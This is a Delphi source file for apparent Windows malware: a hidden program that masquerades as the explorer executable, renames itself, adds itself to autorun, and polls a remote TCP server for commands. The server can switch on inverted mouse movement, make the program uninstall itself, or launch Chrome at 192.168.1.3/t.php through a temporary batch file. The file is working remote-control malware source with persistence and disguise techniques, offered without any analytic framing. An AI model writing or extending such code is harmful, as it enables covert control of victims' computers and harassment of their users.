unit main;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ExtCtrls, Vcl.StdCtrls,
  IdBaseComponent, IdComponent, IdTCPConnection, IdTCPClient, gvar;

type
  TForm2 = class(TForm)
    Timer1: TTimer;
    Timer2: TTimer;
    client: TIdTCPClient;
    Timer3: TTimer;
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form2: TForm2;

var
  MousePos, NewMousePos: TPoint;
  ToBegin: Boolean;
  autorun_path:string;

implementation

{$R *.dfm}

procedure TForm2.FormCreate(Sender: TObject);
var current_filename:string;
var current_dir:string;
begin
  current_filename := ExtractFileName(Application.ExeName);
  current_dir := ExtractFileDir(Application.ExeName)+'\';

  if (FileExists(current_dir+copy(current_filename,1,Length(current_filename)-4)+'_.exe')) then  // запустились через подмену експлорера
  begin
    WinExec(PAnsiChar(current_dir+copy(current_filename,1,Length(current_filename)-4)+'_.exe'),0); // запустим настоящий експлорер
    RenameFile(current_dir+current_filename,'mreverse.exe');
    RenameFile(current_dir+copy(current_filename,1,Length(current_filename)-4)+'_.exe',current_dir+current_filename);
    current_filename := 'mreverse.exe';
  end;

  autorun_path := ExtractFileDir(Application.ExeName)+'\'+current_filename;

  if GetComputerNName <> 'ADMIN' then AddToAutorun(autorun_path);
  ToBegin := false;
  GetCursorPos(MousePos);
end;

procedure TForm2.Timer1Timer(Sender: TObject);
begin
  GetCursorPos(NewMousePos);
  if MousePos.Y <= 0 then MousePos.Y := NewMousePos.Y+1;
  if MousePos.X <= 0 then MousePos.X := NewMousePos.X+1;

  NewMousePos.Y := MousePos.Y - (NewMousePos.Y - MousePos.Y);
  NewMousePos.X := MousePos.X - (NewMousePos.X - MousePos.X);
  SetCursorPos(NewMousePos.X, NewMousePos.Y);
  MousePos := NewMousePos;
end;

procedure TForm2.Timer2Timer(Sender: TObject);
begin
  Timer2.Enabled := false;
  Form2.Visible := false;
end;

procedure TForm2.Timer3Timer(Sender: TObject);
var
  answer: string;
  f:TextFile;
begin
  try
    try
      if not client.Connected then
        client.Connect;
      if client.Connected then
      begin
        client.Socket.WriteLn(GetComputerNName);
        answer := client.Socket.ReadLn();
        if (answer = 'stop') then
          ToBegin := False;
        if (answer = 'run') or (answer = 'go') then
          ToBegin := True;
        if (answer = 'delete') or (answer = 'exit') then
          begin
           Timer1.Enabled := False;
           AddToAutorun(autorun_path, true);
           Application.Terminate;
          end;
        if (answer = 'url') then
          begin
           try
            AssignFile(f,'137.bat');
            Rewrite(f);
            Writeln(f,'"c:\Program Files (x86)\Google\Chrome\Application\chrome.exe" 192.168.1.3/t.php');
            CloseFile(f);
            WinExec('137.bat',0);
            Sleep(10);
            DeleteFile('137.bat');
           except
              end;
          end;

      end;
    finally
      client.Disconnect;
    end;
  except
    if client.Connected then
      client.Disconnect;
  end;

  if ToBegin then GetCursorPos(MousePos);
  Timer1.Enabled := ToBegin;
end;

end.

